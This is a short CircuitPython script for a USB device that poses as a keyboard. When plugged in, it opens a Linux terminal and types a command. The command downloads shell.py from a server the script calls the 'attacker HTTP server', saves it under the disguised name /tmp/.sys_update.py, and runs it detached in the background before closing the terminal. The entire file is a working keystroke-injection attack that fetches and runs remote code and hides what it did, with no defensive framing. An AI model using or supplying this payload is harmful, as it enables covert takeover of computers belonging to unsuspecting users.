import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

# Wait for target OS to recognise the device
time.sleep(3)

# Open terminal (works on GNOME, KDE, XFCE)
kbd.press(Keycode.CONTROL, Keycode.ALT, Keycode.T)
kbd.release_all()
time.sleep(2)

# Pull shell.py from attacker HTTP server, run it detached, close terminal
CMD = (
    "curl -s http://192.168.29.6:8080/shell.py -o /tmp/.sys_update.py "
    "&& nohup python3 /tmp/.sys_update.py &>/dev/null & disown && exit"
)
layout.write(CMD)
time.sleep(0.1)
kbd.press(Keycode.ENTER)
kbd.release_all()
